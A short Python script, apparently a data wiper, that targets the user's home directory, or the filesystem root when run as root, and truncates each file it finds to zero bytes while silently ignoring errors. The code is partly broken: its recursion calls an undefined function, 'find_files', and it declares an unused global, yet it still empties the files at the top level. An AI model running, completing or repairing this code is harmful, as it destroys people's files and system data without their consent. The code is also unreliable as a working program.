import getpass
import os


if getpass.getuser() == "root":
	root = "/"
else:
	root = "/home/{}".format(getpass.getuser())


def main(root):
	global items

	children = list(os.listdir(root))
	for child in children:
		child = root + "/" + child
		if os.path.isdir(child):
			find_files(child)
		else:
			try:
				f = open(child, "bw")
				f.truncate(0)
				f.close()
			except:
				pass


main(root)
